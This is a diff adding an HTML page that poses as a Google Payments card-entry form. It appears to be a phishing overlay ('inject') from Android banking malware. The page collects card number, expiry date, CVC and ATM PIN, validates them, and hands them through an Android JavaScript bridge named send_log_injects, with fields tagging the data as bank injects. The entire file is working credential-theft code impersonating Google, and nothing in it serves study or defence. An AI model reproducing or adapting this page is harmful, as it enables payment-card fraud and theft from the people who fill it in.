@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.bundle.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        body {
+            background-color: #fefefe;
+            color: #333;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 15px;
+        }
+
+        section {
+            padding: 15px;
+            flex: 1;
+        }
+
+        .header-text {
+            padding-left: 20px;
+            font-size: 22px;
+        }
+
+        .fa-times {
+            font-size: 24px;
+        }
+
+        .card-block {
+            margin-top: 30px;
+            display: grid;
+            grid-template-columns: 1fr 10fr;
+            align-items: center;
+        }
+        
+        .cool-input {
+            box-sizing: border-box;
+            border: 0;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+        }
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 10px;
+            padding-left: 0;
+            position: relative;
+            z-index: 2;
+            font-size: 1em;
+        }
+        .cool-input__input:focus {
+            outline: none;
+        }
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: 100%;
+            position: absolute;
+            z-index: 1;
+            left:0;
+            top: 43%;
+            line-height: 0;
+            color: rgb(161, 161, 161);
+            transition: all 0.2s ease;
+        }
+        
+        .cool-input__input_filled + .cool-input__placeholder,
+        .cool-input__input:focus + .cool-input__placeholder {
+            font-size: 0.8em;
+            top: 0;
+            margin-top: -3px;
+        }
+
+        .cool-input__input:focus + .cool-input__placeholder {
+            color: #1871e7;
+        }
+
+        .input {
+            width: 100%;
+            padding: 5px;
+            padding-left: 0;
+            border: 0;
+            border-bottom: 1px solid #aeaeae;
+        }
+        
+        .input:focus {
+            border-color: #1871e7;
+        }
+
+        .card-block:focus-within{
+            color: #1871e7;
+        }
+
+        #errorCC {
+            font-size: 12px;
+            color: #f00;
+            position: relative;
+            float: left;
+            font-weight: 600;
+            display: none;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+
+        #expBlock {
+            margin-top: 10px;
+            width: 100%;
+            height: auto;
+            transition-duration: 0.5s;
+            overflow: hidden;
+            display: none;
+        }
+
+        .active {
+            transition-duration: 0.5s;
+            height: 50px !important;
+        }
+
+        footer {
+            padding: 15px;
+        }
+
+        .button {
+            padding: 10px 45px;
+            display: block;
+            margin: 0 auto;
+            background-color: #1871e7;
+            color: #fff;
+            border: 0;
+            border-radius: 6px;
+        }
+
+        .button:disabled {
+            opacity: 0.4;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <i class="fa fa-times" aria-hidden="true"></i>
+            <span class="header-text">Enter the card details</span>
+        </header>
+        <section>
+            <span style="font-size: 14px;">
+                The information about the cardholder, including his name, must completely match the data on the card.
+            </span>
+            <div class="card-block">
+                <i class="fa fa-hashtag" aria-hidden="true"></i>
+
+                <div class="cool-input">
+                    <input type="tel" id="cc" name="cc" class="input cool-input__input" onkeyup="check();check8();" autocomplete="off" required>
+                    <span class="cool-input__placeholder"> Card number </span>
+                </div>
+
+                <span></span>
+
+            </div>    
+            <img style="position: relative;float: right;top: -30px;margin-bottom: -999px;" id="emptyCC" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACEAAAAVCAAAAADtZNgIAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NTAwMTBFNjg4RkY1MTFFQUIwNTlGQTY1RDI5MDBGMDMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NTAwMTBFNjk4RkY1MTFFQUIwNTlGQTY1RDI5MDBGMDMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1MDAxMEU2NjhGRjUxMUVBQjA1OUZBNjVEMjkwMEYwMyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1MDAxMEU2NzhGRjUxMUVBQjA1OUZBNjVEMjkwMEYwMyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PsCy5ysAAAC2SURBVCjPrdC9C4JAHMbx+6evphAjsK03Gpyi7ZYKCuqCNBwborXxLnshQ0rIXhT9Fbq43CnUd/4MDw/ybSZr56L9A2SFHDGQxwqKaQV/K9WZUCQA48ZSKFKA1VyBxaKcK5opqa6EIrwn+dEPf/xDcJNMAnAHZHiF15iYBwCLkE1G9DSl5cSjrqLPIt5WtD5AR63pGXGi1ArgtqCGB2+Lzh2ANaXbwjt4nCecy1OWZ6PIPco6hx+zoXvKzPqKBAAAAABJRU5ErkJggg==" alt="">
+            <img style="position: relative;float: right;top: -30px;display: none;" id="visaCC" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACEAAAAVCAIAAABHbRCDAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NTgxODJFMjI4RkY1MTFFQTk2RjRGMzk5NTNBRTk2MUMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NTgxODJFMjM4RkY1MTFFQTk2RjRGMzk5NTNBRTk2MUMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1ODE4MkUyMDhGRjUxMUVBOTZGNEYzOTk1M0FFOTYxQyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1ODE4MkUyMThGRjUxMUVBOTZGNEYzOTk1M0FFOTYxQyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PoaAroUAAAM0SURBVHja3FVbSJNhGPY/bPPf0bU5p66lLqfmMUM8pR0MMUS76E4tCgqS8sIgIyGI8KYoDLwQRCgwFKO0PEQoFRml0lqpMyXPbs3DDv82d/h3+LdeE6IL0YsYRM/N//H9fO/zvc/z8L2Iw+Ewm800TYcEAQiCcLlcnCRJkUhEEEQwOHw+n16vR+ETJAIAjuOBQAANCT7+bQ6a9htJh9VOgRq7KPZ71dw+PDK2PK8za1cs5ccPPKgvR1Fk3ewor37IxPF710tv3H9p2aCuVOVnpcpUE7oh1cKnca2T8hbl7W+5fRoqwE5L58ia0V6cr7x24cg2HNUVucWHlUbSefJia/fgZENtCZdgtveqtXpL3F6R3ele0JFOlydVKYW/j3vUsFbIxQTlSYqT/IqQv/HR0Ef1ksdLx8qE2/cBUMhFURECDEWhIml1YijS9kLtDwRqzuSBHhtON4/DAl2evho3mh136kqzUmRpCZEIsnl2TmtSaX6Iwtig3tScAWQUCznb+0Gw8JKCBFDp+6JxcmZNv2bLSIzKTpPr1qzAnZkUzeewyo4lCfiht5oGWp+MkjYXnALijr6vOIZeqshlMvC5ZRPccifPj2Yr+JzQrgFNQ/NrBgMrzIqFqw1/WZKKeZkp0fH7xJcr807kxnu9dEf/WN3dfrPVpdbo2p5/Bm/4bFZuhhyuOD1v2IkjMznaSXnejs6CsZCZyrJMZYwYel8x2A4ly2AhEfMa68ueNZ2FBroHNSqNru/dlIPyRIXzoAPwnPb736sWtvdjC6nKSCYDM5gcoEBJgTJCzN3qA8PQhNhw1aQO9E+Mldjs1Ka2oQxwrvfNFBimXbW29ahdlBdsB6l34sAxBIJEWl0CHuvq+QIf7Z+eW5dJBf5ACKSgs38MvIGwAWVRXvweAZtNMFlMPD0xqrLsYE6GfPDDTNfAxKrRthMHoOnmqW+z6wwGmqyQEgQjMpxfe65QLGSH8QkIPoijW7VChHLS5Twuy0X5aqryY2TCNKUU+KIj+BIRF0X+KLe4uBgIJqD+//Qm7vqo/e0UYbPZJpMJJmIwqns8HgzDEJjkFovF7XYHRSUUhUH+U4ABAPR33Lt1LM3IAAAAAElFTkSuQmCC" alt="">
+            <img style="position: relative;float: right;top: -30px;display: none;" id="masterCC" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACEAAAAVCAIAAABHbRCDAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NjBBNkFGNDE4RkY1MTFFQUJENzU4ODUxRTEwRjRDQzkiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NjBBNkFGNDI4RkY1MTFFQUJENzU4ODUxRTEwRjRDQzkiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2MEE2QUYzRjhGRjUxMUVBQkQ3NTg4NTFFMTBGNENDOSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2MEE2QUY0MDhGRjUxMUVBQkQ3NTg4NTFFMTBGNENDOSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pufl1y0AAAMQSURBVHjatFXLaxNBGJ+ZfZhHmzRNnyYRWkzTmPqoIMQipYoeRMRrL/oPKHgQD+LNi3fv4kHEgxcPvVgqWkREwYoUtQ+xSdMmIcluHs0m+5xx0vRBNxvYHjos7LfffvP7fY/55oOSJImiaBgGOIKFEHK73WyxWPT7/U6n09LIUBQI0c4Gnjssh67r6XSapa92BERR8JcF/esC3pKQ38ddnmBPhQHPE0XEyVmilqkNdPYxoauA77REYFmWEMK2c8FY+lu9+5hGq3/7QSpVNNCrvf+EenyOexEjPQOITsTfjeD8p42V18zobWboZjsoaw5jda184w5OboLdOuFsXpv94DpbQs9lfbwf7KYNC4uNiEvLQJOYkWnrqlhmUXrwBKcy4OBBYHvrjhEJ1XV+RTBnVRb0Py9IedUuh5FIqe8+Ak07oIWA61chR7adII3HRCP+0lff2OVQXr1ljg+Y7Y5hPijvyCUFVVWLM1Jctsuhf/+JBdGsZQjr248MbWmtG3H2s10O7uok9LScRQz10n5/ECdjgdU7bpvj0gWcybX0CtSy/A6dh8edvAVWf9wuBzs2yk2ZrQmGRpEjBmx88Ijw5jig9+QhOADPuZ8+QoN95rOQdOl5DrBIG/YC2FKvE9fQ4IRtDrohFul8+YybjNM+h34fdDpQXw8KhGr5uHZ9mrgOXFzQF2XP3WfHHwIID9Hn0O3ipi56zkSVmTl9YRH/SzFjI1z8PHdlAugFhlRJcQmn5poEzPAt6BkCELW9GhOJBGmzsGFIgiils/WCUEltCoKgyDLVi4Kg1rdSa8tKraypMsY4n88rirKxsdEKQvGt45ifn19fX6dXcldXV6FQ8Hg8mqZRrEgkUq/X6U6GYbLZLJ0LuVyODolYLFatVoPBYCAQsJurjo6OaDRKb+ZKpeJwOCgixQqFQrIsq6pK/4bD4VqtRidbJpOhstfrpb+opXWukskkddCcpe1FCZoCnTNNgTrbFPZsmotO0j19a64gdRBCSF07illLg6aOQhpvqVSiFTsKDprk7u7u/wIMAPqy7QcbPvE1AAAAAElFTkSuQmCC" alt="">
+            <img style="position: relative;float: right;top: -30px;display: none;" id="americaCC" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACEAAAAVCAIAAABHbRCDAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RDM2NzM3OUQ4RkY2MTFFQUE2MUVGQzk4NzZCMzI0RDAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RDM2NzM3OUU4RkY2MTFFQUE2MUVGQzk4NzZCMzI0RDAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpEMzY3Mzc5QjhGRjYxMUVBQTYxRUZDOTg3NkIzMjREMCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpEMzY3Mzc5QzhGRjYxMUVBQTYxRUZDOTg3NkIzMjREMCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PmfY+J4AAAJESURBVHjavFXNbtNAEPb+2ms7P07aKKC0qhAqElxAHLlx48xL8FK8AVdOvAJC9AKVkEpJGhPSxHZcJ/73MmkkKlIcYqQwh7G1M7vfzHw7s3Q+nzuOk+e5sgPBGBuGQV3XbbfbQog1c5YXsspxSFEoweuHZJlt2xQ+twFAXr7++L4/S/OtgChGTw7qb189XV+nVEqJy7bNwmxLgGW8hZwESWnFlN1LKUZNozvHOGoJlW6bJfCxyVpmeNyrja5ihpEXpjongBelBeg4KwyVAAFxWoCbznFWKJyg4SyujHF/X8eflX2T322ok3nSawqTk1zKukZBnwyDR13z2zTcq3F3kVo6i1JZuVbn0/DQEhdeBNGaKqUEyeuoDU4mQdoU5EPfbxn8bLLomBz8N7RTaR5DL35zMsIInTshaFhhBHXr6sCNNIpTWSSp/OqGNZV+uVxAiqycvFKMgRctkuWAefFwbzSLNYa7de30R/CgYwBSkGSHlvbpe9CzxMAJTY0iBVXGCOJMXmdvCaozwgkezqKjtmjrTCroToMLRp7ds8K0uAySpmB+lFXPw41WP2fTqLHsFWBa6TvRhRtB6SBuy1DjLIcqFXDHsgIqWRnjl7w7nWx2gIs3vkoOLO3fMf4qdnln/L95tSmPVVdvcIDOIATBLGAEF7K8PxBCMOIR+o0x8H9+3DruGDdFr3PbTwTDcJFWerVyg1fjsAv9iXg0Ho8BwDTNNQPEJas8hHA6voWQJInv+whecs/z4jjeCROUWpb1U4ABAO2cAd7lNFDfAAAAAElFTkSuQmCC" alt="">
+
+            <div class="card-block" style="margin: 0;">
+                <span></span>
+                <p id="errorCC">Invalid card number</p>
+            </div>
+
+            
+
+            <div class="card-block" style="margin: 0;">
+                <span></span>
+                <div id="expBlock">
+                    <div class="cool-input" style="width: 20%;float: left;margin-right: 20px;margin-top: 10px;">
+                        <input type="tel" id="exp" name="exp" class="input cool-input__input" style="padding-left: 0;" onkeyup="check7();check8();" autocomplete="off">
+                        <span class="cool-input__placeholder" style="left: 0;">MM/YY</span>
+                    </div>
+                    
+                    <div class="cool-input" style="width: 20%;float: left;margin-top: 10px;">
+                        <input type="password" id="cvv" name="cvv" class="input cool-input__input" style="padding-left: 0;" onkeyup="check8();" autocomplete="off">
+                        <span class="cool-input__placeholder" style="left: 0;">CVC</span>
+                    </div>
+                    <div class="cool-input" style="width: 20%;float: left;margin-top: 10px;margin-left: 10px;">
+                        <input type="password" id="pin" name="pin" class="input cool-input__input" style="padding-left: 0;" onkeyup="check8();" autocomplete="off">
+                        <span class="cool-input__placeholder" style="left: 0;">ATM Pin</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <footer>
+            <p style="font-size: 14px;">
+                Through Google Payments, you can add a payment method to your Google account to use them in many Google services.
+                <span style="color: #1871e7;"><u>
+                    Learn more about Google Payments...
+                </u></span>
+            </p>
+            <p style="font-size: 14px;">
+                By continuing, you accept the Google Payments <span style="color: #1871e7;"><u>Terms of Use</u></span>. You also accept the <span style="color: #1871e7;"><u>Privacy Notice</u></span>. It contains information about how your data is processed.
+            </p>
+
+            <p style="font-size: 14px;color: #1871e7;">
+                <u>
+                    Contact the support service of the Google Payments service.
+                </u>
+            </p>
+
+            <input type="submit" class="button" id="sendData" disabled value="Save">
+        </footer>
+    </form>
+    <script>
+        $('#cc').mask('0000 0000 0000 0000');
+        $('#exp').mask('00/00');
+        $('#cvv').mask('000');
+        $('#pin').mask('0000');
+
+        $('.cool-input__input').on('input', function(){
+           var $this = $(this);
+           if ($this.val() == '') {
+               $this.removeClass('cool-input__input_filled');
+           } else {
+               $this.addClass('cool-input__input_filled');
+           }
+        });
+
+        function check() {
+            if(!valid_credit_card(cc.value)){
+                errorCC.style.display = 'block';
+            } else {
+                errorCC.style.display = 'none';
+            }
+
+            if(cc.value.length === 0) {
+                document.getElementById('emptyCC').style.display = 'inline';
+                document.getElementById('americaCC').style.display = 'none';
+                document.getElementById('masterCC').style.display = 'none';
+                document.getElementById('visaCC').style.display = 'none';
+            }
+
+            if(cc.value.match("^(4)") != null){
+                document.getElementById('emptyCC').style.display = 'none';
+                document.getElementById('americaCC').style.display = 'none';
+                document.getElementById('masterCC').style.display = 'none';
+                document.getElementById('visaCC').style.display = 'inline';
+            }
+
+            if(cc.value.match("^(51|52|53|54|55)") != null){
+                document.getElementById('emptyCC').style.display = 'none';
+                document.getElementById('americaCC').style.display = 'none';
+                document.getElementById('masterCC').style.display = 'inline';
+                document.getElementById('visaCC').style.display = 'none';
+            }
+
+            if(cc.value.match("^(34)") != null){
+                document.getElementById('emptyCC').style.display = 'none';
+                document.getElementById('americaCC').style.display = 'inline';
+                document.getElementById('masterCC').style.display = 'none';
+                document.getElementById('visaCC').style.display = 'none';
+            }
+        }
+
+        function check6(cb) {
+            if(!valid_credit_card(cb)) {
+                cc.classList.add('error');
+            } else {
+                cc.classList.remove('error');
+                expBlock.style.display = 'block';
+                setTimeout(() => {
+                    
+                    expBlock.classList.add('active')
+                }, 1);
+                return true
+            }
+        }
+        function check7() {
+            
+            var mmYY = exp.value.split('/');
+            var month = parseInt(mmYY[0]);
+            var year = parseInt(mmYY[1]);
+    
+            var expArray = exp.value.split('/');
+            var today, someday;
+            var exMonth = expArray[0];
+            var exYear = "20" + expArray[1];
+    
+            today = new Date();
+            someday = new Date();
+            someday.setFullYear(exYear, exMonth, 1);
+                    
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+        }
+
+        function check8() {
+            if(check6(cc.value) && check7() && cvv.value.length === 3 && pin.value.length === 4) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+                data.cc = cc.value;
+                data.exp = exp.value;
+                data.cvc = cvv.value;
+                data.pin = pin.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+</body>
+</html>
